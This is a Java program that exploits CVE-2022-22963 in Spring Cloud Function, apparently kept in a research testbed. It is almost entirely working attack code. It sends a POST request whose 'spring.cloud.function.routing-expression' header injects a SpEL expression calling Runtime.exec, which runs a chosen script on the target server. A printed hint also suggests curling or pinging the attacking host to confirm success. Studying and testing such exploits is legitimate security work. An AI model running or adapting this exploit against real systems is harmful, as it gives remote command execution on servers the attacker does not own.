package com.anonuser;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

public class SpringCloud_CVE_2022_22963 {


    public static void main(String[] args) {
        try {
            String url = "http://0.0.0.0:8080";
            String command = "/home/pamusuo/research/permissions-manager/exploit-apps/files/create_file.sh";

            System.out.println("\n\033[0;37m[\033[0;33m!\033[0;37m] It is possible that the output of the injected command is not reflected in the response, to validate if the server is vulnerable run a ping or curl to the attacking host\n");

            // Set the request headers
            Map<String, String> headers = new HashMap<>();
            headers.put("spring.cloud.function.routing-expression", "T(java.lang.Runtime).getRuntime().exec(\"" + command + "\")");

            // Create the JSON payload
            String payload = "{\"data\": \"\"}";

            // Create a URL object
            URL obj = new URL(url);

            // Create a HttpURLConnection object
            HttpURLConnection con = (HttpURLConnection) obj.openConnection();

            // Set the request method to POST
            con.setRequestMethod("POST");

            // Set the request headers
            for (Map.Entry<String, String> entry : headers.entrySet()) {
                con.setRequestProperty(entry.getKey(), entry.getValue());
            }

            // Enable input and output streams
            con.setDoOutput(true);

            // Write the payload data
            try (OutputStream os = con.getOutputStream()) {
                byte[] input = payload.getBytes("utf-8");
                os.write(input, 0, input.length);
            }

            // Get the response code
            int responseCode = con.getResponseCode();
            System.out.println("Response Code: " + responseCode);

            // Read the response
            try (BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()))) {
                String inputLine;
                StringBuilder response = new StringBuilder();

                while ((inputLine = in.readLine()) != null) {
                    response.append(inputLine);
                }

                // Print the response
                System.out.println(response.toString());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
